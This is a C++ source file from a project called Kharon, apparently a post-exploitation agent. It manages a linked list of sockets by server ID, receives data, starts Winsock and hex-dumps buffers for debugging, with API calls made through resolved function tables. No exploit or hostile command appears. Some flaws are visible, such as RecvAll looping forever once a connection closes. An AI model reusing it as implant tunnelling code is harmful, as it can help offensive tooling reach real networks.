#include <Kharon.h>

auto DECLFN Socket::Exist(
    _In_ ULONG ServerID
) -> BOOL {
    PSOCKET_CTX Current = Ctx;

    if ( !Current ) return FALSE;

    while ( Current ) {
        if ( Current->ServerID == ServerID ) 
            return TRUE;
        Current = Current->Next;
    }
    return FALSE;
}

auto DECLFN Socket::Get(
    _In_ ULONG  ServerID
) -> SOCKET {
    PSOCKET_CTX Current = Ctx;

    if ( !Current ) return FALSE;

    while ( Current ) {
        if ( Current->ServerID == ServerID ) return Current->Socket;
        Current = Current->Next;
    }
    return NULL;
}

auto DECLFN Socket::Add(
    _In_ ULONG  ServerID,
    _In_ SOCKET Socket
) -> ERROR_CODE {
    if ( Exist( ServerID ) ) {
        return ERROR_ALREADY_EXISTS; 
    }

    PSOCKET_CTX newCtx = (PSOCKET_CTX)hAlloc( sizeof( SOCKET_CTX ) );
    if (!newCtx) {
        return ERROR_OUTOFMEMORY;
    }

    newCtx->Socket   = Socket;
    newCtx->ServerID = ServerID;
    newCtx->Next     = Ctx; 
    Ctx              = newCtx;
    Count++;

    return ERROR_SUCCESS;
}

auto DECLFN Socket::RmCtx(
    _In_ ULONG ServerID
) -> ERROR_CODE {
    PSOCKET_CTX* Prev    = &Ctx;
    PSOCKET_CTX  Current = Ctx;

    while ( Current ) {
        if ( Current->ServerID == ServerID ) {
            *Prev = Current->Next;
            hFree( Current ); 
            Count--;
            return ERROR_SUCCESS;
        }
        Prev = &Current->Next;
        Current = Current->Next;
    }
    return ERROR_NOT_FOUND;
}

auto DECLFN Socket::RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead ) -> BOOL {
    DWORD tret   = 0;
    DWORD nret   = 0;
    PVOID Start = Buffer;

    while ( tret < Length )
    {
        nret = Self->Ws2_32.recv( Socket, (CHAR*)Start, Length - tret, 0 );

        if ( nret == SOCKET_ERROR )
        {
            KhDbg( "recv Failed" )
            *BytesRead = tret;
            return FALSE;
        }

        Start  = PTR( U_PTR( Start ) + nret );
        tret  += nret;
    }

    *BytesRead = tret;

    return TRUE;
}

auto DECLFN Socket::InitWSA( VOID ) -> BOOL {
    WSADATA WsData = { 0 };
    DWORD   Result = 0;

    if ( !this->Initialized ) {
        KhDbg( "Init Windows Socket..." )

        if ( ( Result = Self->Ws2_32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
        {
            KhDbg( "WSAStartup Failed: %d\n", Result )

            Self->Ws2_32.WSACleanup();
            return FALSE;
        }

        this->Initialized = TRUE;
    }

    return TRUE;
}

auto DECLFN Socket::LogData(
    _In_ const char* description,
    _In_ const BYTE* data,
    _In_ ULONG length
) -> VOID {
    if (!data || length == 0) return;
    
    KhDbg("%s (%d bytes):", description, length);
    for (ULONG i = 0; i < length; i++) {
        if (i % 16 == 0) {
            if (i > 0) Self->Ntdll.DbgPrint("\n");
            Self->Ntdll.DbgPrint("[%04X] ", i);
        }
        Self->Ntdll.DbgPrint("%02X ", data[i]);
    }
    Self->Ntdll.DbgPrint("\n");
}